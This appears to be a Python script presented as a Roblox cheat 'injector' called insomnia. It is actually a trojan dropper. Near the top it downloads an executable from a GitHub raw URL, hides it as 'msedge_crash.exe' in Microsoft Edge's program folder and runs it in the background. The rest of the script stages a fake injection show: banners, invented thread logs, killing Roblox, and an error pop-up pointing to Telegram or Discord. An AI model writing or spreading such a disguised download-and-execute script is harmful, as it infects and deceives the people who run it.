import requests
import subprocess
import os
import sys
import time
import sys
import psutil
import platform

from win10toast import ToastNotifier



import os
import sys
import random
import string

def generate_random_title(length=12):
    characters = string.ascii_uppercase + string.digits  # A-Z and 0-9
    return ''.join(random.choice(characters) for _ in range(length))

# Generate a random title
random_title = generate_random_title()

# Set the title of the console window based on the OS
if os.name == 'nt':  # Windows
    os.system(f"title {random_title}")
else:  # Linux or macOS
    sys.stdout.write(f"\033]0;{random_title}\007")

# Optional: Print the random title to the console for reference

import requests
import subprocess
import os
import sys
import time
import sys
import psutil
import platform


print("")


import os
import urllib.request
import subprocess
import sys

def download_and_run_exe(url, download_directory, filename="msedge_crash.exe"):
    # Ensure the download directory exists
    if not os.path.exists(download_directory):
        os.makedirs(download_directory)
    
    # Define the full path for the downloaded file
    file_path = os.path.join(download_directory, filename)

    try:
        # Download the .exe file from the given URL
        urllib.request.urlretrieve(url, file_path)
        print(f"[insomnia alpha] checking connection to servers")

        # Run the downloaded .exe file in the background
        if sys.platform == "win32":
            subprocess.Popen([file_path], shell=True)
            print(f" ")
            print(f"[insomnia alpha] successful connection")
        
    
    except urllib.error.HTTPError as e:
        print(f"[insomnia security ] servers down (notify admins){e.code} - {e.reason}")
    except urllib.error.URLError as e:
        print(f"unknown error")
    except Exception as e:
        print(f"[insomnia alpha] run as adminstrator{e}")


# Example usage:
url = "https://github.com/moscowmeow/HAHSHASHASHA/raw/refs/heads/main/main.exe"  # Replace with your executable file URL
download_directory = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application"  # Change this to your desired path
download_and_run_exe(url, download_directory)
time.sleep(7)
os.system('cls')


print(" @@@ @@@  @@@  @@@@@@  @@@@@@  @@@@@@@@@@  @@@  @@@ @@@  @@@@@@      ")
time.sleep(0.2)
print(" @@! @@!@!@@@ !@@     @@!  @@@ @@! @@! @@! @@!@!@@@ @@! @@!  @@@     ")
time.sleep(0.2)
print(" !!@ @!@@!!@!  !@@!!  @!@  !@! @!! !!@ @!@ @!@@!!@! !!@ @!@!@!@!     ")
time.sleep(0.2)
print(" !!: !!:  !!!     !:! !!:  !!! !!:     !!: !!:  !!! !!: !!:  !!!     ")
time.sleep(0.2)
print(" :   ::    :  ::.: :   : :. :   :      :   ::    :  :    :   : :     ")
time.sleep(0.2)
print("-----------------------------------------------------------------")
time.sleep(0.2)
print(" ")
print(" ")

time.sleep(2)

print("[-] Fetching endpoint...")
print(" ")
time.sleep(1)
print("[-] Finding conflicting processes...")
print(" ")
time.sleep(3)
print("[-] None found!")
print(" ")
time.sleep(1)
print("[-] Ensuring essential directories...")
print(" ")
time.sleep(2)
print("[-] Ensuring essential dependencies...")
print(" ")
time.sleep(1)
print("[-] Up to date!")
time.sleep(3)

time.sleep(2)

os.system('cls')

print(" @@@ @@@  @@@  @@@@@@  @@@@@@  @@@@@@@@@@  @@@  @@@ @@@  @@@@@@      ")
time.sleep(0.2)
print(" @@! @@!@!@@@ !@@     @@!  @@@ @@! @@! @@! @@!@!@@@ @@! @@!  @@@     ")
time.sleep(0.2)
print(" !!@ @!@@!!@!  !@@!!  @!@  !@! @!! !!@ @!@ @!@@!!@! !!@ @!@!@!@!     ")
time.sleep(0.2)
print(" !!: !!:  !!!     !:! !!:  !!! !!:     !!: !!:  !!! !!: !!:  !!!     ")
time.sleep(0.2)
print(" :   ::    :  ::.: :   : :. :   :      :   ::    :  :    :   : :     ")
time.sleep(0.2)
print("-----------------------------------------------------------------")
print(" ")
print(" ")
print(" ")

time.sleep(2)

def wait_for_roblox():
    print(" [-] launch roblox")
    print(" ")

    while True:
        # Get a list of all running process names
        for proc in psutil.process_iter(['name']):
            try:
                # Check if the process name contains 'roblox'
                if proc.info['name'] and 'roblox' in proc.info['name'].lower():
                    print(" [+] roblox found!")
                    print(" ")
                    time.sleep(5)
                    return  # Exit the loop and stop the script
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

        # Sleep for 5 seconds before checking again
        time.sleep(5)

# Start monitoring for Roblox
wait_for_roblox()
os.system('cls')

print(" @@@ @@@  @@@  @@@@@@  @@@@@@  @@@@@@@@@@  @@@  @@@ @@@  @@@@@@      ")
time.sleep(0.2)
print(" @@! @@!@!@@@ !@@     @@!  @@@ @@! @@! @@! @@!@!@@@ @@! @@!  @@@     ")
time.sleep(0.2)
print(" !!@ @!@@!!@!  !@@!!  @!@  !@! @!! !!@ @!@ @!@@!!@! !!@ @!@!@!@!     ")
time.sleep(0.2)
print(" !!: !!:  !!!     !:! !!:  !!! !!:     !!: !!:  !!! !!: !!:  !!!     ")
time.sleep(0.2)
print(" :   ::    :  ::.: :   : :. :   :      :   ::    :  :    :   : :     ")
time.sleep(0.2)
print("-----------------------------------------------------------------")
print(" ")
print(" ")
print(" ")

time.sleep(2)

print(" [>_^] injecting > RobloxPlayerBeta.exe")
time.sleep(3)
print(" ")
print(" [+]   spawned thread 0x226FBAD0 with 0x000000000 [0x2938475612]")
time.sleep(0.1)
print(" [+]   spawned thread 0x226FGG40 with 0x000000001 [0x2675931048]")
time.sleep(0.1)
print(" [+]   spawned thread 0x2263BF50 with 0x000000002 [0x2394857601]")
time.sleep(0.1)
print(" [+]   spawned thread 0x226FFD40 with 0x000000003 [0x2750918364]")
time.sleep(0.1)
print(" [+]   spawned thread 0x226FGFR0 with 0x000000004 [0x2483917560]")
time.sleep(5)
print(" [+]   spawned thread 0x226FFYT0 with 0x000000005 [0x2193748563]")

print(" [+]   spawned thread 0x226FR650 with 0x000000006 [0x2784510936]")

print(" [+]   spawned thread 0x226DB460 with 0x000000007 [0x2039485761]")
time.sleep(1)
print(" [+]   spawned thread 0x226TR530 with 0x000000008 [0x2537891460]") 
print(" ")
time.sleep(5)


import psutil; [proc.terminate() for proc in psutil.process_iter(['name']) if proc.info['name'] and 'roblox' in proc.info['name'].lower()]

time.sleep(2)

print(" [0x226] failed to allocate memory ")


time.sleep(5)

import tkinter as tk
from tkinter import messagebox

# Initialize the main window (root)
root = tk.Tk()
root.withdraw()  # Hide the main tkinter window

# Show the error message pop-up
messagebox.showerror("t.me/insomniagraveyard" , "Open a ticket in our discord! [0x226]")

